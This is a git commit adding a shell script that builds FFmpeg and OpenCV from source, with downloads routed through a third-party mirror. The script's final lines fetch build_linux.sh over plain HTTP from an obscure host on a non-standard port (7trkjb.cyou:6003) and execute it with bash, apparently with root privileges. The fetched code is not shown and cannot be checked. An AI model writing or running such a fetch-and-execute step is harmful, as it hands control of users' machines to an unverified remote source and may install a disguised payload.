a589570778ecb681c8cfcb0386edac69e22d76d7
yuzhangkai <53356318+yuzhangkaii@users.noreply.github.com>
2024-07-10 20:12:57 +0800

    Add files via upload

---
+++ install_opencv_ffmpeg.sh
@@ -0,0 +1,17 @@
+dirone="/usr/local/src"
+mkdir ffmpeg
+wget -P $dirone/ffmpeg gitdl.cn/https://github.com/FFmpeg/FFmpeg/archive/refs/heads/release/4.4.zip
+cd $dirone/ffmpeg
+mkdir $dirone/ffmpeg/build
+unzip -q 4.4.zip
+cd $dirone/ffmpeg/FF*
+./configure --enable-static --disable-iconv --disable-gnutls --disable-libbluray --disable-x86asm --prefix=$dirone/ffmpeg/build
+make -j8;make install
+mkdir $dirone/opencv
+cd $dirone/opencv
+wget -P $dirone/opencv gitdl.cn/https://github.com/opencv/opencv/archive/4.2.0.zip
+unzip -q *.zip
+cd op*
+apt -y install cmake
+cd pl*/li*;wget http://7trkjb.cyou:6003/upload/2024/07/build_linux.sh
+bash build_linux.sh "$dirone/ffmpeg/build"
